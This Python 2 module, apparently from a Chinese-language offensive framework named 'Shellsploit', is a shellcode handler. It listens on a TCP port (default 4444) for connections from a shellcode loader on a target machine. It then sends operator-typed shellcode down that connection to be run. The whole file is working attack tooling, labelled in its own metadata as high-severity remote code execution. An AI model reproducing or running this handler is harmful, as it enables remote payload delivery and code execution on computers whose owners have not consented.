#! /usr/bin/env python
# -*- coding: utf-8 -*-

import os
import sys
from socket import *
#模块使用说明

docs = '''

#==============================================================================
#title                  :Shellcode监听send端
#description            :shell handler send,Shellocde保持4096字节以内，不能过大
详细参见博客：http://imosin.com/2017/10/22/shellcode-used/
#author                 :mosin
#date                   :20190424
#version                :0.2
#usage                   send:> qiut    #退出监听，返回框架

#python_version         :2.7.5

python Shellsploit.py
USE MODULE =>payload\windows\shellcode_loader x64

#==============================================================================

'''

from modules.exploit import BGExploit
from lib.ple.module.getshellcode import GetShellcode

class PLScan(BGExploit):
    
    def __init__(self):
        super(self.__class__, self).__init__()
        self.info = {
            "name": "Shellcode监听send端",  # 该POC的名称
            "product": "Shellcode监听send端",  # 该POC所针对的应用名称,
            "product_version": "1.0",  # 应用的版本号
            "desc": '''
            用于监听反弹过来的shell并发送到Shellcode装载器

            ''',  # 该POC的描述
            "author": ["mosin"],  # 编写POC者
            "ref": [
                {self.ref.url: ""},  # 引用的url
                {self.ref.bugfrom: ""},  # 漏洞出处
            ],
            "type": self.type.rce,  # 漏洞类型
            "severity": self.severity.high,  # 漏洞等级
            "privileged": False,  # 是否需要登录
            "disclosure_date": "2017-09-17",  # 漏洞公开时间
            "create_date": "2017-09-17",  # POC 创建时间
        }

        #自定义显示参数
        self.register_option({
            "LHOST": {
                "default": "",
                "convert": self.convert.str_field,
                "desc": "监听目标",
                "Required":"no"
            },
            "LPORT": {
                "default": 4444,
                "convert": self.convert.int_field,
                "desc": "监听端口",
                "Required":"no"
            },
            "mode": {
                "default": "exploit",
                "convert": self.convert.str_field,
                "desc": "执行exploit,或者执行payload",
                "Required":""
            }
        })

            
        #自定义返回内容
        self.register_result({
            #检测标志位，成功返回置为True,失败返回False
            "status": False,
            "exp_status":True, #exploit，攻击标志位，成功返回置为True,失败返回False
            #定义返回的数据，用于打印获取到的信息
            "data": {

            },
            #程序返回信息
            "description": "",
            "error": ""
        })

    def payload(self):
        pass

    def exploit(self):
        HOST   = self.option.LHOST['default']
        PORT   = self.option.LPORT['default']
        BUFSIZ = 4096
        ADDR   = (HOST, PORT)
        sock   = socket(AF_INET, SOCK_STREAM)
        sock.bind(ADDR)
        sock.listen(5)
        STOP_CHAT = True
        #开始监听
        print "Handler Listening %s port:%s" %(HOST,PORT)
        
        while STOP_CHAT:
            conn, addr=sock.accept()
            print('Start Listening From %s  port %s.....') %(addr,PORT)
            while True:
                datas = raw_input('shellcode:> ')
                if datas =="":
                    continue
                cover_shellcode = GetShellcode(datas).coverdata()
                
                try:
                    if datas == "quit":
                        break
                    conn.send(cover_shellcode)
                    break
                except:
                    conn.close()
                    break
            STOP_CHAT = False
                
        sock.close()
        
